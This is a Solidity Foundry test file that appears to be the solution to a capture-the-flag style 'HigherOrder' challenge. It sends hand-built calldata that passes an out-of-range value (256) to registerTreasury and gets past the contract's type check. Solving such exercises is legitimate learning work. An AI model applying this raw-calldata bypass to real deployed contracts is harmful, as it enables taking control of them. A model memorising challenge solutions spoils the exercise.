// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std-v1.13.0/Test.sol";
import {HigherOrder} from "./HigherOrder.sol";

contract HigherOrderTest is Test {
    /// storage
    HigherOrder public target;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        target = new HigherOrder();
    }

    function testSolution() public {
        bytes memory callData = abi.encodeWithSelector(HigherOrder.registerTreasury.selector, bytes32(uint256(256)));

        console.logBytes(callData);

        (bool success,) = address(target).call(callData);
        require(success, "Execution should pass");
    }
}
